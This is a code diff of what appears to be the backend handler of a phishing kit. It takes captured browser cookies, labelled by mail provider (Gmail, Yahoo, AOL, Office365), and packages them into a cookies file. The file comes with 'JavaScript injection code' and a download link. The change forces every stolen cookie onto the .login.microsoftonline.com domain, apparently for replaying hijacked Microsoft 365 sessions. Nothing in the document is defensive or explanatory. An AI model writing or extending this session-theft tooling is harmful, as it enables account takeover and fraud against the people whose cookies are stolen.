@@ -74,12 +74,15 @@ export const handler = async (event, context) => {
       sample: Array.isArray(cookieInfo) && cookieInfo.length > 0 ? cookieInfo[0] : 'No cookies'
     });
 
-    // Enhanced cookie formatting with multiple fallback methods
+    // Force .login.microsoftonline.com as the only allowed domain
     let formattedCookies = [];
     
     // Method 1: Direct array
     if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
-      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name);
+      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name).map(cookie => ({
+        ...cookie,
+        domain: '.login.microsoftonline.com'
+      }));
       console.log('✅ Method 1: Direct array, found', formattedCookies.length, 'cookies');
     }
     
@@ -88,12 +91,14 @@ export const handler = async (event, context) => {
       try {
         const parsedCookies = JSON.parse(cookieInfo);
         if (Array.isArray(parsedCookies)) {
-          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name);
+          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name).map(cookie => ({
+            ...cookie,
+            domain: '.login.microsoftonline.com'
+          }));
           console.log('✅ Method 2: JSON parse, found', formattedCookies.length, 'cookies');
         }
       } catch (e) {
         console.log('⚠️ JSON parsing failed, trying cookie string parsing');
-        
         // Method 3: Parse document.cookie format
         if (cookieInfo.includes('=')) {
           const cookieStrings = cookieInfo.split(';');
@@ -104,10 +109,7 @@ export const handler = async (event, context) => {
               return name && value ? {
                 name: name.trim(),
                 value: value.trim(),
-                domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
-                       provider === 'Yahoo' ? '.yahoo.com' : 
-                       provider === 'AOL' ? '.aol.com' : 
-                       '.login.microsoftonline.com',
+                domain: '.login.microsoftonline.com',
                 path: '/',
                 secure: true,
                 httpOnly: false,
@@ -134,10 +136,7 @@ export const handler = async (event, context) => {
           return name && value ? {
             name: name.trim(),
             value: value.trim(),
-            domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
-                   provider === 'Yahoo' ? '.yahoo.com' : 
-                   provider === 'AOL' ? '.aol.com' : 
-                   '.login.microsoftonline.com',
+            domain: '.login.microsoftonline.com',
             path: '/',
             secure: true,
             httpOnly: false,
@@ -245,32 +244,10 @@ Download link: ${event.headers.host ? `https://${event.headers.host}` : 'https:/
     try {
       console.log('📎 Preparing cookies file...');
       
-      // Determine domain based on provider
-      let defaultDomain = '.login.microsoftonline.com';
-      
-      if (provider === 'Gmail' || provider === 'Google') {
-        defaultDomain = '.google.com';
-      } else if (provider === 'Yahoo') {
-        defaultDomain = '.yahoo.com';
-      } else if (provider === 'AOL') {
-        defaultDomain = '.aol.com';
-      } else if (provider === 'Office365' || provider === 'Outlook') {
-        defaultDomain = '.login.microsoftonline.com';
-      }
-      
-      // Ensure cookies have the proper format
+      // Only Microsoft domain
       const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
-        name: cookie.name || '',
-        value: cookie.value || '',
-        domain: cookie.domain || defaultDomain,
-        path: cookie.path || "/",
-        secure: cookie.secure !== false,
-        httpOnly: cookie.httpOnly !== false,
-        sameSite: cookie.sameSite || "none",
-        expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-        hostOnly: cookie.hostOnly || false,
-        session: cookie.session !== false,
-        storeId: cookie.storeId || null
+        ...cookie,
+        domain: '.login.microsoftonline.com'
       })) : [];
       
       // Create JavaScript injection code
